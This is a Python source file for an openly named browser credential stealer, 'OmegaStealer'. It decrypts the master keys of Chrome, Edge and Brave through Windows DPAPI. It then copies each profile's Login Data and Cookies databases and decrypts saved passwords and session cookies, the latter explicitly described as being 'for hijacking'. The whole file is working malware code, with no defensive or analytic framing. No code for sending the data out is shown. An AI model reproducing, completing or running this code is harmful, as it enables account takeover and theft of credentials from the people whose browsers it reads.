import os
import json
import base64
import sqlite3
import shutil
import ctypes
from ctypes import wintypes
import time

# ── DPAPI DECRYPTION ────────────────────────────────────────────────────────
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.BYTE))]

def dpapi_decrypt(data):
    """Decrypts data using Windows Data Protection API (DPAPI)."""
    blob_in = DATA_BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.BYTE)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        res = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return res
    return None

# ── AES GCM DECRYPTION ──────────────────────────────────────────────────────
def aes_decrypt(ciphertext, key):
    """Decrypts v10+ Chrome/Edge data using AES-256-GCM."""
    try:
        from Crypto.Cipher import AES
    except ImportError:
        return None # PyCryptodome required for modern Chrome
        
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode() # Remove tag and decode
    except Exception:
        return None

# ── STEALER CORE ────────────────────────────────────────────────────────────
class OmegaStealer:
    def __init__(self):
        self.browsers = {
            "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
        }

    def get_master_key(self, browser_path):
        """Extracts and decrypts the browser's master encryption key."""
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
        
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:] # Remove 'DPAPI' prefix
            master_key = dpapi_decrypt(encrypted_key)
            return master_key
        except:
            return None

    def steal_passwords(self):
        """Extracts passwords from all supported browsers."""
        results = []
        for name, path in self.browsers.items():
            if not os.path.exists(path): continue
            
            master_key = self.get_master_key(path)
            if not master_key: continue
            
            # Chrome uses profiles (Default, Profile 1, etc.)
            profiles = ["Default"]
            for d in os.listdir(path):
                if d.startswith("Profile "): profiles.append(d)
                
            for profile in profiles:
                login_data_path = os.path.join(path, profile, "Login Data")
                if not os.path.exists(login_data_path): continue
                
                # Copy to temp to bypass lock
                temp_db = os.path.join(os.environ["TEMP"], f"omega_{int(time.time())}.db")
                try:
                    shutil.copy2(login_data_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, user, enc_pass in cursor.fetchall():
                        if not user or not enc_pass: continue
                        
                        password = None
                        if enc_pass.startswith(b'v10'):
                            password = aes_decrypt(enc_pass, master_key)
                        else:
                            password = dpapi_decrypt(enc_pass)
                        
                        if password:
                            results.append({
                                "browser": name,
                                "profile": profile,
                                "url": url,
                                "user": user,
                                "pass": password
                            })
                    
                    conn.close()
                    os.remove(temp_db)
                except Exception:
                    if os.path.exists(temp_db): os.remove(temp_db)
        
        return results

    def steal_cookies(self):
        """Extracts session cookies for hijacking."""
        results = []
        for name, path in self.browsers.items():
            if not os.path.exists(path): continue
            
            master_key = self.get_master_key(path)
            if not master_key: continue
            
            profiles = ["Default"]
            try:
                for d in os.listdir(path):
                    if d.startswith("Profile "): profiles.append(d)
            except: pass
                
            for profile in profiles:
                # Chrome 96+ moved cookies to Network/Cookies
                cookie_paths = [
                    os.path.join(path, profile, "Network", "Cookies"),
                    os.path.join(path, profile, "Cookies")
                ]
                
                for cp in cookie_paths:
                    if not os.path.exists(cp): continue
                    
                    temp_db = os.path.join(os.environ["TEMP"], f"c_{int(time.time())}.db")
                    try:
                        shutil.copy2(cp, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
                        
                        for host, cname, enc_val, cpath, expiry in cursor.fetchall():
                            value = None
                            if enc_val.startswith(b'v10') or enc_val.startswith(b'v11'):
                                value = aes_decrypt(enc_val, master_key)
                            else:
                                value = dpapi_decrypt(enc_val)
                                
                            if value:
                                results.append({
                                    "browser": name,
                                    "host": host,
                                    "name": cname,
                                    "value": value,
                                    "path": cpath,
                                    "expiry": expiry
                                })
                        conn.close()
                        os.remove(temp_db)
                    except:
                        if os.path.exists(temp_db): os.remove(temp_db)
        
        return results

stealer = OmegaStealer()
